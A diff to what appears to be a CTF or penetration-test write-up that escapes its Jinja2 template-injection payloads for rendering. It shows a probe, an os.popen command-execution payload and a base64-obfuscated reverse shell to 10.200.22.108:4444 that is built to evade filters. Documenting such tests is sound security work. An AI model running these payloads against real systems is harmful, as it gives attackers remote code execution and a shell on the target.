@@ -117,7 +117,7 @@ The template input field was tested for SSTI vulnerabilities.
 **Initial Test:**
 
 ```
-{{ 7*7 }}
+{% raw %}{{ 7*7 }}{% endraw %}
 ```
 
 **Result:** `49` - Confirmed Jinja2 SSTI vulnerability
@@ -127,7 +127,7 @@ The template input field was tested for SSTI vulnerabilities.
 **Command Execution Test:**
 
 ```python
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}{% endraw %}
 ```
 
 **Result:** `uid=1000(ghill_sa) gid=1000(ghill_sa) groups=1000(ghill_sa)`
@@ -139,7 +139,7 @@ The template input field was tested for SSTI vulnerabilities.
 Reverse shell payload (Base64 encoded to bypass filters):
 
 ```python
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMjAwLjIyLjEwOC80NDQ0IDA+JjEpICY=|base64 -d|bash').read() }}
+{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMjAwLjIyLjEwOC80NDQ0IDA+JjEpICY=|base64 -d|bash').read() }}{% endraw %}
 ```
 
 The base64 decodes to:
